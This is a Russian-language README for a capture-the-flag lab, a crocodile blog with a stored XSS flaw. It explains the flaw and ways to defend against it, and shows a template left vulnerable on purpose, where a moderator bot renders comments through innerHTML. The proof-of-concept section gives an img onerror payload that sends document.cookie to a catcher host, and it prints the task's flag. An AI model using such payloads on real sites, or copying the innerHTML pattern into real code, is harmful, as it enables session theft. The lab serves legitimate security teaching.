# Crocodile Blog CTF

Этот проект представляет собой CTF-задание, демонстрирующее уязвимость **Stored XSS (межсайтовый скриптинг)**. Участнику необходимо создать комментарий с вредоносным JavaScript-кодом, чтобы украсть куки бота-модератора и получить флаг.


## Описание уязвимости

**Stored XSS** — тип атаки, при котором вредоносный код внедряется на сервер (например, через форму комментариев) и сохраняется в базе данных. При каждом запросе страницы этот код выполняется в браузере жертвы.

Уязвимость возникает из-за отсутствия экранирования пользовательского ввода при выводе.


## Способы защиты

1. Экранирование вывода — использование `escape` или `textContent` вместо `innerHTML`
2. Content Security Policy (CSP) — ограничение источников скриптов
3. HttpOnly куки — защита от кражи сессионных cookie
4. Валидация ввода — очистка от HTML-тегов

## Уязвимость в этом приложении

Приложение представляет собой блог о крокодилах. Пользователи могут регистрироваться и оставлять комментарии. Также есть бот, проверяющий комментарии, на которые пожаловались пользователи.

### Где спрятана уязвимость

Она находится в файле app/templates/blog.html:
```python
<div class="comment-content" data-content="{{ comment.content }}">
</div>

<script>
document.querySelectorAll('.comment-content').forEach(el => {
    const content = el.dataset.content;
    const isBot = document.cookie.includes('flag') || document.body.dataset.username === 'bot';
    
    if (isBot) {
        el.innerHTML = content;  // Для бота
    } else {
        el.textContent = content; // Для пользователей
    }
});
</script>
```

### Как это работает

Обычные пользователи видят комментарии на сайте как простой текст. А бот-модератор, который владеет важной cookie, видит комментарии как HTML и выполняет JavaScript-код. Из-за содежания в куках секретной информации, уязвимость становится критичной:

```python
# В bot/bot_checker.py
page.evaluate(f"document.cookie = 'flag={FLAG}; path=/';")
```

Уязвимость существует именно из-за разного отображения для обычных пользователей и для бота.

## PoC-эксплойт для получения флага

1. Зайдите в приложение с помощью браузера: http://127.0.0.1:5000
2. Создайте нового пользователя: придумайте имя и пароль. Зарегистрируйтесь и войдите в систему под этими учетными данными.
3. Выберите любую статью и напишите комментарий:
   ```html
   <img src=x onerror="fetch('http://localhost:5001/catch?c='+document.cookie)">
   ```
4. Скопируйте ссылку на комментарий и пожалуйтесь на него через бота.
5. После обработки комментария бот выдаст флаг:
   ```bash
   FLAG: practice{XSS_ghj567OpPFGTH8gv_miem_ctf_2026}
   ```
